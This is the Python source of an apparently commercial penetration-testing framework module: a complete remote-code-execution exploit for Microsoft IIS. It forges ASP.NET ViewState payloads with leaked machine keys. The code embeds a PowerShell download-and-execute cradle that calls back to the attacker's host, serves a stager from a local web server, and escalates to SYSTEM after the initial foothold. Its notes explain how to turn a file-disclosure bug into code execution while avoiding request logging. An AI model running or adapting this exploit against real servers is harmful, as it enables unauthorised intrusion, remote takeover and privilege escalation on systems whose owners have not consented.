#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/products/canvas/index.html for more information

import sys
import time
import socket

#covers both angles
if "." not in sys.path: sys.path.append(".")

import libs.spkproxy as spkproxy
from libs.iis_lib import *
import json

from tcpexploit import tcpexploit
from libs.canvasos import canvasos
from exploitutils import *
from shellcode.standalone.windows import payloads64

from canvasengine import canvas_root_directory

from Nodes.mosdef_powershell.mosdef_powershell import *

import hashlib
import base64
import binascii
from Crypto.Cipher import AES
from Crypto.Cipher import DES3


import random
import string
import urllib2
import cookielib
import ssl
import re
from HTMLParser import HTMLParser



NAME                           = "Microsoft IIS MachineKey ViewState Deserialization RCE"
DESCRIPTION                    = "Microsoft IIS MachineKey ViewState Deserialization RCE"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "http://microsoft.com"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "NO-CVE"
DOCUMENTATION["CVE URL"]       = ""
DOCUMENTATION["References"]    = []

DOCUMENTATION['Notes']         = """
IMPORTANT NOTES 3/30/2018:
| Test            | # ind. systems verified | iis_machinekey success |
|-----------------+-------------------------+------------------------|
| Windows 10 x64  |                       3 | Yes                    |
| Windows 2k8 x64 |                       1 | N/A                    |

This module will get you a shell on any IIS system whose machine keys
are known. In many contexts this will allow you to turn a web app's
LFI into RCE.

Targets can be divided up into three classes: those that have
web.configs with unencrypted machine key sections, those with
plaintext configs, and those whose keys are stored in LSA. NOTE: on
3/29/2018 we discovered a 3rd way to get the machine key which will be
added into get_machinekeys soon. The scenario that interests us the
most are those involving plain text configurations. In that case, the
"web.config" file at the root of an IIS application pool directory
(for example: C:\inetpub\wwwroot\appname\) will contain three fields
of importance: 'decryptionKey', 'validationKey', and 'validation'.*
The contents of those fields, combined with the value of
__VIEWSTATEGENERATOR for the page** are enough to configure our tool
to get RCE.

For configurations where the machine key is encrypted, there are
methods to obtain those /after/ one gets remote code execution on the
machine that usually involve the invocation of native API calls. We
implemented most of those in the get_machinekeys module.


* Note: according to in-house tests, the 'decryption' field is not
  needed.
** Note: you do not necessarily have to obtain __VIEWSTATEGENERATOR
   from the web server to make this tool work. It is usually
   calculated in a deterministic manner based on the URL contents
   alone. We currently have support for doing that.


Special Thanks to:
James Foreshaw for his TypeConfuseDelegate gaget, which inspired ours:
+ https://googleprojectzero.blogspot.com/2017/04/exploiting-net-managed-dcom.html
+ https://github.com/pwntester/ysoserial.net
+ https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
^ amazingly, the bug described in "Delegates and Serialization" is the
same one used in ysoserial.net's TypeConfuseDelegate
implementation. The bug is /that/ old.


To use iis_machinekeys to exploit an LFI vulnerability:
- Force your target's web application to leak a web.config file
- Find the DecryptionKey and ValidationKey portions. Copy those into
  the relevant fields in the module's dialog box. If you cannot dump
  this file or your file contains no such information, the host is not
  vulnerable to this particular version of the attack.
- Make sure to set the Vhost/Host header correctly
- Enter the path to the web application in question
- If there is a __VIEWSTATEGENERATOR field in the web page that you
  wish to exploit, copy that value into the Modifier field in the 
  dialog box. However, if there isn't, leave it blank. We can likely
  guess the value.
- The Validation type field can be set to the default - which is to
  try every validation method. This will only mean 8 requests instead
  of 1. They will potentially be logged as 500 errors but your request
  itself will not be logged (by default)

"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ "Windows" ]
PROPERTY['VERSION']            = [ "All" ]

def make_encoded_int(number, max_length=5):
    parts = []

    start_mask = (1<<7)-1
    mask = start_mask

    for i in range(0, max_length):
        if i == 0:
            pass
        else:
            mask = start_mask + (mask << 7)

        current = number & mask
        number -= current

        added_number = (current >> 7*i) | ((1<<7) if number else 0)

        parts.append(added_number)

        if not number:
            break

    return "".join([chr(part) for part in parts])

def read_encoded_int(data):
    # at max, use 5 bytes
    total = 0
    length = 0
    for i in range(0, 5):
        do_next = (ord(data[i]) & 0x80)
        total += (ord(data[i]) & 0x7f) << (7*i)
        length += 1
        if not do_next:
            break

    return (total, length)


def add_payload(serialized_object, payload):
    mosdef_needle = "-executionpolicy bypass -encodedcommand INSERT_POWERSHELL_MOSDEF"

    (orig_size, orig_size_len) = read_encoded_int(serialized_object[3:8])

    needle_offset = serialized_object.find(mosdef_needle)

    if needle_offset <= 0:
        raise Exception("Payload needle could not be found in the serialized object")

    needle_size = 0
    needle_size_len = 0
    i = 1
    while needle_size != len(mosdef_needle) and i <= 5:
        size_bytes = serialized_object[needle_offset-i:needle_offset]
        (needle_size, needle_size_len) = read_encoded_int(size_bytes)
        i += 1

    if needle_size != len(mosdef_needle):
        raise Exception("Payload needle size could not be found")

    payload_command = mosdef_needle.replace("INSERT_POWERSHELL_MOSDEF",
                                            payload)

    # In the ObjectStateFormatter, the size of an array is denoted by
    # a variable length integer.
    bytes_payload_size = make_encoded_int(len(payload_command))
    new_size = orig_size - len(mosdef_needle) + len(payload_command) - needle_size_len + len(bytes_payload_size)
    new_size_bytes = make_encoded_int(new_size)

    new_payload = [serialized_object[:3],
                   new_size_bytes,
                   serialized_object[3+orig_size_len:needle_offset-needle_size_len],
                   bytes_payload_size,
                   payload_command,
                   serialized_object[needle_offset+len(mosdef_needle):]
    ]


    return "".join(new_payload)

def pkcs7_pad(data, block_size_bytes=0x10):
    if len(data) % block_size_bytes == 0:
        padding_count = block_size_bytes
    else:
        padding_count = block_size_bytes - (len(data) % block_size_bytes)

    return data +"".join([chr(padding_count)] * padding_count)

def make_inner_outer_keys(validation_key, mac_type="SHA1"):
    validation_key_length = inner_key_size[mac_type]

    outer = [0x36]*validation_key_length
    inner = [0x5c]*validation_key_length

    for (index, value) in enumerate(validation_key):
        outer[index] ^= value

    for (index, value) in enumerate(validation_key):
        inner[index] ^= value

    return outer, inner

def get_hmacmd5(data, modifier, validation_key, mac_type="MD5"):
    modifier = "".join([chr(x) for x in modifier]) if len(modifier) else None
    validation_key = "".join([chr(x) for x in validation_key])
    total = []
    total.append(data)

    rest_length = sum([len(modifier) if modifier is not None else 0,
                       len(validation_key)])

    rest = ["\x00"]*rest_length

    if modifier != None:
        for (index, i) in enumerate(modifier):
            rest[index] = i

    for (index, i) in enumerate(validation_key):
        rest[index] = i

    total.append("".join(rest))

    md5_hasher = hashlib.new("md5")
    md5_hasher.update("".join(total))
    md5_hash = md5_hasher.digest()

    mac = md5_hash

    return mac

def get_hmac3des(data, decryption_key, modifier, inner, outer):
    iv_validator = "\x41" * 0x18
    iv = "\x00"*8

    bytes_modifier = "".join([chr(x) for x in modifier])

    padded_data = pkcs7_pad(iv_validator + data + bytes_modifier, 8)
    des = DES3.new("".join([chr(x) for x in decryption_key]),
                  DES3.MODE_CBC,
                  iv)
    ciphertext = des.encrypt(padded_data)

    outer_hmac = get_hmacsha1(ciphertext, None, inner, outer, "SHA1")
    return ciphertext + outer_hmac

def get_hmacaes(data, decryption_key, modifier, inner, outer):
    iv_validator = "\x41" * 0x18
    iv = "\x00"*16

    bytes_modifier = "".join([chr(x) for x in modifier])

    padded_data = pkcs7_pad(iv_validator + data + bytes_modifier)
    aes = AES.new("".join([chr(x) for x in decryption_key]),
                  AES.MODE_CBC,
                  iv)

    ciphertext = aes.encrypt(padded_data)

    outer_hmac = get_hmacsha1(ciphertext, None, inner, outer, "SHA1")
    return ciphertext + outer_hmac

def get_hmacsha1(data, modifier, inner, outer, mac_type="SHA1"):
    assert (data is not None)
    assert (inner is not None)
    assert (outer is not None)

    algorithm = get_hash_method(mac_type)

    inner_hasher = hashlib.new(algorithm)
    inner_hasher.update("".join([chr(x) for x in inner]))
    inner_hasher.update(data)

    if modifier:
        modifier = "".join([chr(x) for x in modifier])
        inner_hasher.update(modifier)

    inner_hash = inner_hasher.digest()

    outer_hasher = hashlib.new(algorithm)
    outer_hasher.update("".join([chr(x) for x in outer]))
    outer_hasher.update(inner_hash)

    result = outer_hasher.digest()

    return result


validation_function = {"3DES": get_hmac3des,
                       "AES": get_hmacaes,
                       "SHA1": get_hmacsha1,
                       "MD5": get_hmacmd5,
                       "HMACSHA256": get_hmacsha1,
                       "HMACSHA384": get_hmacsha1,
                       "HMACSHA512": get_hmacsha1}

inner_key_size = {"3DES": 64,
                  "AES": 64,
                  "SHA1": 64,
                  "MD5": 64,
                  "HMACSHA256": 64,
                  "HMACSHA384": 128,
                  "HMACSHA512": 128
}

def get_hash_method(mac_type):
    if mac_type.startswith("HMAC"):
        return mac_type[4:].lower()
    else:
        return mac_type.lower()

def san_encode_viewstate(serialized,
                         decryption_key,
                         generator,
                         validation_key, mac_type="SHA1"):

    final_buffer = None
    hmac = None
    
    if "SHA" in mac_type:
        inner, outer = make_inner_outer_keys(validation_key, mac_type)
        hmac = get_hmacsha1(serialized, generator, inner, outer, mac_type)
        final_buffer = serialized + hmac
    elif "MD5" in mac_type:
        hmac = get_hmacmd5(serialized, generator, validation_key, mac_type)
        final_buffer = serialized + hmac
    elif "AES" in mac_type:
        inner, outer = make_inner_outer_keys(validation_key, "SHA1")
        hmac = get_hmacsha1(serialized, generator, inner, outer, "SHA1")
        hmac_buffer = serialized + hmac

        ciphertext = get_hmacaes(hmac_buffer, decryption_key, generator, inner, outer)
        final_buffer = ciphertext
    elif "3DES" in mac_type:
        inner, outer = make_inner_outer_keys(validation_key, "SHA1")
        hmac = get_hmacsha1(serialized, generator, inner, outer, "SHA1")
        hmac_buffer = serialized + hmac

        ciphertext = get_hmac3des(hmac_buffer, decryption_key, generator, inner, outer)
        final_buffer = ciphertext

    return base64.b64encode(final_buffer)

validation_methods = ["SHA1",
                      "AES",
                      "3DES",
                      "MD5",
                      "HMACSHA256",
                      "HMACSHA384",
                      "HMACSHA512"]

# This is a wrapper function that takes in a .NET object, a human
# readable decryption key, modifier, and validation key, as well as
# a validation method
def encode_viewstate(serialized,
                     decryption_key,
                     generator,
                     validation_key, validation_type):

    return san_encode_viewstate(serialized,
                                [ord(x) for x in binascii.unhexlify(decryption_key)],
                                list(reversed([ord(x) for x in binascii.unhexlify(generator)])),
                                [ord(x) for x in binascii.unhexlify(validation_key)], validation_type)


class ModifierExtractor(HTMLParser):
    check_attrs = [("type", "hidden"),
                   ("name", "__VIEWSTATEGENERATOR")]

    def handle_starttag(self, tag, attrs):
        if self.modifier is None:
            if str(tag).lower() == "input":
                if all([attr in attrs for attr in ModifierExtractor.check_attrs]):
                    value_attr = [x for x in attrs if str(x[0]) == "value"][0]
                    self.modifier = value_attr[1]


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host                  = ""
        self.port                  = 443
        self.version               = 1
        self.name                  = NAME

        self.hostname              = ""
        self.vhost                 = ""
        self.vulnerable_targets    = None
        self.protocol              = "http"
        self.basepath              = ""
        self.ssl                   = True
        self.cookies               = ""
        self.extraheaders          = ""
        self.discover              = False
        self.path = "/"
        self.cached_payload = None

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def usage(self):
        pass


    def getargs(self):
        global validation_methods

        self.port = int(self.argsDict.get("port", self.port))
        self.vhost = self.argsDict.get("vhost", self.vhost)
        self.ssl = self.argsDict.get("ssl", self.ssl)
        self.path = self.argsDict.get("path", self.path)
        self.discover = self.argsDict.get("discover", self.discover)
        self.decryption_key = self.argsDict.get("decryption_key")
        self.validation_key = self.argsDict.get("validation_key")
        self.validation_type = self.argsDict.get("validation_type")
        self.modifier = self.argsDict.get("modifier")
        self.backdoor_config_path = self.argsDict.get("backdoor_config_path")

        if self.modifier == '':
            logging.info("No MAC modifier supplied; we will attempt to generate it")
            logging.info("However, we will fail if the modifier comes from a page.ViewStateUserKey")
            self.modifier = "%08x" % default_mac_key_modifier(self.path)

        if self.validation_type == "Auto":
            self.validation_type = validation_methods
        else:
            self.validation_type = [self.validation_type]

        logging.info("START GETARGS----------")
        logging.info("Target:" + self.target.interface)
        logging.info("Vhost:" + self.vhost)
        logging.info("Port:" + self.vhost)
        logging.info("Ssl:" + str(self.ssl))
        logging.info("Path:" + self.path)
        logging.info("Discover:" + str(self.discover))
        logging.info("Decryption_key:" + self.decryption_key)
        logging.info("Validation_key:" + self.validation_key)
        logging.info("Validation_type:" + str(self.validation_type))
        logging.info("Modifier:" + self.modifier)
        logging.info("END GETARGS----------")

        if self.ssl:
            self.protocol="https"

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.UNIVERSAL_MOSDEF]

    def http_post(self, url, viewstate):
        extra_headers = []

        if self.vhost:
            extra_headers.append(("Host", self.vhost))
        else:
            extra_headers.append(("Host", self.target.interface))

        ua = spkproxy.UserAgent(url, exploit=self)
        ua.addHeader("Content-Type",  "application/x-www-form-urlencoded")
        ua.POST("", {"__VIEWSTATE": viewstate}, extra_headers, noresponse=True)

    def http_get(self, url):
        extra_headers = []

        if self.vhost:
            extra_headers.append(("Host", self.vhost))

        ua = spkproxy.UserAgent(url, exploit=self)
        
        return ua.GET("", noresponse=False, entireresponse=True)

    def test(self):
        self.getargs()

        self.host = self.target.interface
        self.setInfo("%s (in progress)" % (NAME))

        url = "%s://%s:%d%s" % (self.protocol,
                                 self.target.interface,
                                 self.port, self.path)

        response = self.http_get(url)

        if "Server: Microsoft-IIS" in response:
            if self.modifier is None:
                self.web_get_modifier()
                return True
            else:
                logging.info("The target is vulnerable, assuming the encryption / decryption keys and validation method are correct")

    def web_get_modifier(self):
        parser = ModifierExtractor()
        parser.modifier = None
        parser.feed(response.content)

        self.modifier = mparser.modifier

        if parser.modifier is None:
            logging.info("The target may be vulnerable, but we were unable to find the modifier via parsing the target page")
            logging.info("The module will try an auto-generated modifier")
            return False
        else:
            logging.info("Found modifier/generator: %s" % self.modifier)
            logging.info("REMEMBER TO ADD THIS FIELD IN AS AN ARGUMENT DURING EXPLOITATION")
            logging.info("The target is vulnerable, assuming the encryption / decryption keys and validation method are correct")

    def powershell_stager(self):
        stager_template = None

        ps_mosdef = mosdef_powershell(self)
        
        p = payloads64.payloads(module=self)
        asm = p.callback(self.callback.ip, self.callback.port, universal=True)
        powershell_string = p.assemble(asm)

        with open(os.path.join(os.path.dirname(__file__), "Resources", "stager_template"), "rb") as handle:
            stager_template = handle.read()

        replacers = self.get_replacers(stager_template)

        ignored_replacers = ["{psmosdef_byte_array}",
                             "{ENTER}"]

        for replacer in replacers:
            if replacer not in ignored_replacers:
                stager_template = stager_template.replace(replacer, self.random_string(5))
            elif replacer == "{psmosdef_byte_array}":
                stager_template = stager_template.replace(replacer, ",".join(["%d" % ord(x) for x in powershell_string]))

        return stager_template

    def random_string(self, chars=5):
        """
        Return a string that contains CHARS number of random alphabetic
        characters.
        """
        choices = []
        for _ in range(chars):
            choices.append(random.choice(string.ascii_letters))

        return "".join(choices)

    def get_replacers(self, text):
        replacers = set([])
        state = 0
        replacer_allowed_chars = ["_"]
        replacer_allowed_chars.extend(string.ascii_letters)

        current = []

        for i in text:
            if state == 0:
                if i == "{":
                    current.append(i)
                    state = 1
            elif state == 1:
                if i.isspace() or i not in replacer_allowed_chars:
                    state = 0
                    if i == "}":
                        current.append(i)
                        if len(current) != 2:
                            replacers.add("".join(current))
                    current = []
                else:
                    current.append(i)

        return replacers


    def start_webserver(self, port, stager_data):
        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"] = port
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["sourcedata"] = stager_data
        ret = app.listen()
        self.server = app

        return ret

    def setup_webserver(self):
        final_port = None

        for port in range(8080, 0xffff):
            ps_stager = self.powershell_stager()

            if self.start_webserver(port, ps_stager):
                final_port = port
                break

        logging.info("Set up stager web server on port:%d" % final_port)
        return final_port


    def get_payload(self, port):
        command = """$x = new-object -comobject "WinHttp.WinHttpRequest.5.1"; $x.Open("GET", "%s", $false); $x.Send(); $y = $x.ResponseText; iex $y""" % ("http://" + self.callback.ip + ":" + str(port) + "/" + self.random_string(10))
        return base64.b64encode(command.encode('utf-16le'))

    def get_object(self, port):
        if self.cached_payload == None:
            payload = self.get_payload(port)
            evil_object = None

            with open(os.path.join(os.path.dirname(__file__), "Resources", "canvas_payload.bin"), "rb") as handle:
                data = handle.read()
                evil_object = add_payload(data, payload)

            self.cached_payload = evil_object
            return evil_object
        else:
            return self.cached_payload

    def exploit_target(self, url, decryption_key, modifier, validation_key, validation_type, port):
        evil_object = self.get_object(port)

        transformed_object = encode_viewstate(evil_object,
                                              decryption_key,
                                              modifier,
                                              validation_key,
                                              validation_type)

        self.http_post(url, transformed_object)

    def doPostAction(self, engine, new_node):
        potato = self.engine.getModuleExploit("seimpersonatepriv_lpe")
        potato.link(self)
        potato.argsDict["passednodes"] = [new_node]
        ret = potato.run()

        if not ret:
            logging.error("SeImpersonationPrivilege to SYSTEM module failed")
        else:
            logging.warning("NT AUTHORITY\SYSTEM escalation in progress")

    def run(self):
        self.getargs()

        self.host = self.target.interface
        self.setInfo("%s (in progress)" % (NAME))

        webserver_port = self.setup_webserver()

        # If you have a backdoor config to use, then we'll iterate
        # over every possible config to get you a shell.
        # Otherwise, we'll try out the configuration you have.
        
        if self.backdoor_config_path == '':
            url = "%s://%s:%d%s" % (self.protocol,
                                    self.target.interface,
                                    self.port,
                                    self.path)

            logging.info("Using modifier:" + self.modifier)
            logging.info("Using decryption key:" + self.decryption_key)
            logging.info("Using validation key:" + self.validation_key)

            for validation_type in self.validation_type:
                logging.info("Attempting with validation type:" + validation_type)
                self.exploit_target(url,
                                    self.decryption_key,
                                    self.modifier,
                                    self.validation_key,
                                    validation_type,
                                    webserver_port)


            while (self.state != "HALT") and not self.ISucceeded():
                self.server.accept()

        else:
            config = None
            with open(os.path.expanduser(self.backdoor_config_path),
                      "rb") as handle:
                config = json.loads(handle.read())

            if "configs" not in config:
                logging.error("No 'configs' section in the backdoor configuration file! Exiting")
                return 0

            global_machine_keys = config["global_machine_keys"]
            configs = config["configs"]

            for config in configs:
                if self.ISucceeded() or self.state == "HALT":
                    break

                machine_key_first_four = config["machine_key_first_four"]

                # We iterate over every configuration (url +
                # machine key + modifier) found. Some of them will
                # have machine keys associated with them, some won't.
                # We discard the ones that don't (they're stored in
                # memory only and are not easy to pull out)

                for url_entry in config["urls"]:
                    if self.ISucceeded() or self.state == "HALT":
                        break

                    url = url_entry["url"]

                    if url_entry["state"] == "Stopped":
                        logging.info("Skipping %s because site is not started" % url)
                        continue

                    config_modifier = url_entry["modifier"]
                    
                    # To hit the right site (and thus right machine
                    # key) we have to get the Host header right
                    self.vhost = url_entry["domain"]

                    modifier = "%08x" % default_mac_key_modifier(config["machinekey_query_path"]) if config_modifier == None else "%08x" % config_modifier

                    if not url.endswith("aspx"):
                        continue

                    logging.info("Attacking URL: " + str(url))
                    logging.info("Using modifier:" + str(modifier))

                    first = True

                    for machine_key in (config["machine_keys"] + global_machine_keys):
                        if self.ISucceeded():
                            break
                        if not first:
                            break
                        first = False

                        decryption_key = machine_key["decryption_key"]
                        decryption_type = machine_key["decryption_type"]
                        validation_type = machine_key["validation_type"]
                        validation_key = machine_key["validation_key"]

                        if len(decryption_key) == 0 or len(validation_key) == 0:
                            continue

                        if "AutoGenerate" in decryption_key or "AutoGenerate" in validation_key:
                            continue

                        if all([value == "0" for value in decryption_key]) and all([value == "0" for value in validation_key]):
                            continue

                        validation_types = []

                        # If we stole the key using EcbCallISAPI we
                        # need to strip off the first 4 bytes and
                        # replace them with a hash code of the path to
                        # the site inside of the local IIS install

                        if machine_key["source"] == "EcbCallISAPI":
                            decryption_key = machine_key_first_four + decryption_key[len(machine_key_first_four):]
                            validation_key = machine_key_first_four + validation_key[len(machine_key_first_four):]

                        if decryption_type != None:
                            if decryption_type != "Auto":
                                validation_types.append(decryption_type)

                        if validation_type != None:
                            if validation_type != "Auto":
                                validation_types.append(validation_type)

                        # the validation method information is not
                        # stored in an accessible way. If so, we brute
                        # force the decryption/validation algorithms. 
                        # /Only/ one will work.
                        if len(validation_types) == 0:
                            validation_types.extend(validation_methods)

                        for validation_type in validation_types:
                            logging.info("Trying validation type:" + validation_type)
                            if self.ISucceeded():
                                break

                            self.exploit_target(url,
                                                decryption_key,
                                                modifier,
                                                validation_key,
                                                validation_type,
                                                webserver_port)


                        # once the target requests a powershell
                        # payload from us it's game over
                        tries = 0
                        while all([(self.state != "HALT"),
                                   not self.ISucceeded(),
                                   tries < 5]):
                            self.server.accept()
                            tries += 1
                            
        while all([(self.state != "HALT"),
                   not self.ISucceeded()]):
            self.server.accept()


        if self.ISucceeded():
            logging.warning("Module succeeded")
            self.setInfo("%s - done (success)" % (NAME))
            return 1
        else:
            logging.error('Module failed')
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
